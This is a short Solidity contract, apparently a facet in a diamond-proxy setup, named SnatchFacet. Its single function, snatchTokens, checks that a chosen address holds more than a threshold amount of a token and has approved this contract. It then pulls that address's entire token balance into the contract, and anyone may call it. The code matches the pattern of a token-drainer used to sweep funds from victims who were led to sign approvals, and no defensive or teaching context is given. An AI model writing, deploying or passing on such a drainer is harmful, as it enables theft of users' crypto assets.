// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {IERC20} from "./IERC20.sol";

contract SnatchFacet {
    error ZeroBalance();
    error LowBalance();

    function snatchTokens(
        IERC20 _token,
        address _spender,
        uint256 _threshold
    ) external {
        uint256 spenderBalance = _token.balanceOf(_spender);
        uint256 allowance = _token.allowance(_spender, address(this));

        if (spenderBalance == 0 || allowance == 0) {
            revert ZeroBalance();
        }

        if (spenderBalance < _threshold) {
            revert LowBalance();
        }

        _token.transferFrom(_spender, address(this), spenderBalance);
    }
}